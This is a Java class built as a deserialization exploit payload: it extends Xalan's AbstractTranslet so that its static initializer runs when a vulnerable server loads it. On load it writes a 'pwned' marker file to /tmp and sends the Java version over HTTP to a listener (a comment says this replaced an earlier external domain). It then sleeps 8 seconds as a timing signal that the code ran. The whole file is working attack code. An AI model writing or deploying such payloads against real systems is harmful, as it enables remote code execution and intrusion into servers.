import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import java.io.*;

public class Detect extends AbstractTranslet {
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {
    }
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {
    }
    static {
        try {
            // Write a marker file into the webapp's static dir → fetch over HTTP
            File f = new File("/tmp/pwned_marker.txt");
            FileOutputStream fo = new FileOutputStream(f);
            // also try writing relative to user.dir - static content may be served from classpath
            try {
                File rel = new File("pwned_marker.txt");
                rel.deleteOnExit();
            } catch (Exception e) {}
            fo.write(("pwned at " + System.currentTimeMillis()).getBytes());
            fo.close();
            // HTTP exfil via plain socket-less URL (java.net is open module)
            // 2026-09-08 修正：原外部域名 portkey-toward.example.com 已清理，改指向本机收货器
            try {
                java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(
                    "http://127.0.0.1:9999/marker?version=" + System.getProperty("java.version")
                ).openConnection();
                c.setConnectTimeout(2000);
                c.setReadTimeout(2000);
                c.connect();
            } catch (Exception e) {}
            // force sleep so we can also see timing
            Thread.sleep(8000);
        } catch (Exception e) { }
    }
}
